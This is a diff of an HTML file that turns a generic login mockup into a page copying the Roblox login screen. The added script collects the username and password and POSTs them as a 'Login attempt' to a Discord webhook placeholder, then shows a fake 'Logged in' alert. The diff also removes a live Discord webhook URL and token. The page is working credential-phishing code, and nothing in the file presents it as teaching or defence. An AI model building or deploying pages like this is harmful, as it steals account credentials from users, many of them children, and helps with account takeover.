@@ -1,13 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>UI Replica</title>
+  <title>Login</title>
 
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
       background: #000;
+      overflow: hidden;
     }
 
     /* NAVBAR */
@@ -15,64 +16,47 @@
       position: fixed;
       top: 0;
       width: 100%;
-      height: 44px;
-      background: #1a1a1d;
+      height: 50px;
+      background: #121215;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 0 16px;
-      color: #fff;
+      padding: 0 20px;
+      color: #f7f7f8;
+      z-index: 10;
+    }
+
+    .nav-links span {
+      margin: 0 15px;
+      color: #aaa;
+      cursor: pointer;
       font-size: 14px;
     }
 
-    .logo-box {
-      width: 90px;
-      height: 20px;
-      background: #2a2a2f; /* placeholder instead of logo */
-    }
-
-    .nav-center {
-      display: flex;
-      gap: 40px;
-      color: #b8b8b8;
-    }
-
-    .nav-center span:hover {
+    .nav-links span:hover {
       color: white;
-      cursor: pointer;
-    }
-
-    .nav-right {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .search {
-      background: #2a2a2f;
-      border: 1px solid #3a3a3f;
-      border-radius: 6px;
-      padding: 4px 10px;
-      color: white;
-      width: 200px;
     }
 
     .signup {
       background: #335fff;
-      padding: 4px 10px;
+      padding: 6px 12px;
       border-radius: 6px;
-      font-size: 12px;
+      font-size: 13px;
     }
 
-    /* BACKGROUND (different on purpose) */
+    /* BACKGROUND */
     .background {
       position: absolute;
       width: 100%;
       height: 100%;
-      background: url("https://images.unsplash.com/photo-1500530855697-b586d89ba3ee");
+
+      background:
+        radial-gradient(circle at center, rgba(0,0,0,0.5), rgba(0,0,0,0.9)),
+        url("https://picsum.photos/1920/1080");
+
       background-size: cover;
       background-position: center;
-      filter: brightness(0.4);
+      filter: blur(3px);
     }
 
     /* LOGIN BOX */
@@ -81,86 +65,57 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 300px;
 
-      background: #2b2d36;
-      padding: 20px;
-      border-radius: 6px;
+      background: #1c1c22;
+      padding: 30px;
+      border-radius: 14px;
+      width: 320px;
+      text-align: center;
       color: white;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.7);
     }
 
-    .login-box h2 {
-      margin: 0 0 15px;
-      font-size: 20px;
+    h2 {
+      margin-bottom: 20px;
       font-weight: 600;
     }
 
-    .input {
+    input {
       width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-
-      border-radius: 6px;
-      border: 1px solid #3a3a3f;
-      background: #1f2026;
-      color: white;
-      font-size: 13px;
-    }
-
-    .login-btn {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-
-      background: transparent;
-      border: 1px solid #8f8f94;
-      border-radius: 6px;
-      color: #d1d1d6;
-      cursor: pointer;
-    }
-
-    .login-btn:hover {
-      border-color: white;
-    }
-
-    .link {
-      text-align: center;
-      font-size: 12px;
-      color: #cfcfcf;
+      padding: 12px;
       margin: 10px 0;
-    }
-
-    .divider {
-      height: 1px;
-      background: #3a3a3f;
-      margin: 15px 0;
-    }
-
-    .secondary-btn {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 10px;
-
-      background: #3a3c45;
+      border-radius: 8px;
       border: none;
-      border-radius: 6px;
-      color: #d1d1d6;
+      background: #2a2a30;
+      color: white;
+      font-size: 14px;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      background: #335fff;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: 600;
       cursor: pointer;
     }
 
-    .secondary-btn:hover {
-      background: #4a4d57;
+    button:hover {
+      background: #244edb;
+      box-shadow: 0 6px 20px rgba(51,95,255,0.4);
     }
 
-    .bottom-text {
-      text-align: center;
+    .small-text {
+      margin-top: 10px;
       font-size: 12px;
-      color: #cfcfcf;
-    }
-
-    .bottom-text span {
-      color: #4ea1ff;
-      cursor: pointer;
+      color: #aaa;
     }
   </style>
 </head>
@@ -169,51 +124,40 @@
 
   <!-- NAVBAR -->
   <div class="navbar">
-    <div class="logo-box"></div>
+    <div><strong>ROBLOX</strong></div>
 
-    <div class="nav-center">
+    <div class="nav-links">
       <span>Charts</span>
       <span>Marketplace</span>
       <span>Create</span>
       <span>Robux</span>
     </div>
 
-    <div class="nav-right">
-      <input class="search" placeholder="Search">
-      <div class="signup">Sign Up</div>
-    </div>
+    <div class="signup">Sign Up</div>
   </div>
 
+  <!-- BACKGROUND -->
   <div class="background"></div>
 
-  <!-- LOGIN -->
+  <!-- LOGIN BOX -->
   <div class="login-box">
     <h2>Login to Roblox</h2>
 
-    <input class="input" placeholder="Username/Email/Phone">
-    <input class="input" type="password" placeholder="Password">
+    <input type="text" id="username" placeholder="Username / Email / Phone">
+    <input type="password" id="password" placeholder="Password">
 
-    <button class="login-btn">Log In</button>
+    <button onclick="sendData()">Log In</button>
 
-    <div class="link">Forgot Password or Username?</div>
-
-    <div class="divider"></div>
-
-    <button class="secondary-btn">Email Me a One-Time Code</button>
-    <button class="secondary-btn">Quick Sign-In</button>
-
-    <div class="bottom-text">
-      Don’t have an account? <span>Sign Up</span>
-    </div>
+    <div class="small-text">Forgot Password or Username?</div>
   </div>
 
   <!-- SCRIPT -->
   <script>
     function sendData() {
-      const name = document.getElementById("username").value || "Anonymous";
-      const msg = document.getElementById("message").value;
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
 
-      const webhookURL = "https://discord.com/api/webhooks/1495877685338177577/ec19rPYMRLTzhqlZLqavw2qpqmcoyNA2RoUTAfq_T49q9VMthATi12VnwlEtUY02nRs2";
+      const webhookURL = "YOUR_NEW_WEBHOOK_URL";
 
       fetch(webhookURL, {
         method: "POST",
@@ -221,11 +165,16 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: name + ": " + msg
+          content: "Login attempt:\nUsername: " + user + "\nPassword: " + pass
         })
+      })
+      .then(() => {
+        alert("Logged in (demo)");
+      })
+      .catch(err => {
+        console.error(err);
+        alert("Error");
       });
-
-      alert("Sent!");
     }
   </script>
 
